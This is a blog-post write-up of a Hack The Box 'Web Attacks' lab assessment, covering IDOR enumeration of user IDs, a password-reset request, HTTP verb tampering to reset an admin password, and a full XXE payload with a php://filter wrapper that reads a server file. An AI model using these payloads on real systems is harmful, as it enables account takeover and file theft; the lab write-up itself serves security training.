---
layout: post
title: "Web Attacks - Writeup"
date: 2026-05-08 10:00:00 +0200
description: "Writeup for HTB Web-Attacks Skill Assessment."
categories: [hackthebox]
tags: [hackthebox]
---

# Web Attacks — Skill Assessment Writeup

## Step 1: IDOR — User Enumeration

The application manages sessions using a `uid` cookie. Modifying this value allows impersonating other users.

While browsing profiles, an API call fetches user data via a URL parameter:

```
GET /api/user?id=52
```

Using Burp Suite Intruder (Battering Ram) to enumerate user IDs and filtering responses for `Administrator` with `grep`:

```json
{
  "uid": "52",
  "username": "a.corrales",
  "full_name": "Amor Corrales",
  "company": "Administrator"
}
```

---

## Step 2: Understand the password-reset flow

The password reset function calls two endpoints:

- GET /api.php/token/52
- POST /reset.php

The first endpoint provides a token which we will need for the second one - the second endpoint is a POST request with the following body:
```
uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=test
```
However after trying, we get a Access denied...

---

## Step 3: HTTP Verb Tampering — Admin Password Reset

The password reset endpoint only restricted specific HTTP methods. Switching the verb allowed resetting the admin password.

---

## Step 4: XXE — Local File Read

Logged in as admin, the Add Event feature sends an XML body:

```xml
<root>
  <name>event name</name>
  <details>event details</details>
  <date>2026-05-13</date>
</root>
```

The `<name>` field is reflected in the response. Using a PHP filter wrapper to base64-encode file contents avoids issues with newlines and special characters breaking reflection:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
  <name>&file;</name>
  <details>details</details>
  <date>date</date>
</root>
```

Response:

```
Event '<base64string>' has been created.
```

Decode:

```bash
echo "<base64string>" | base64 -d
```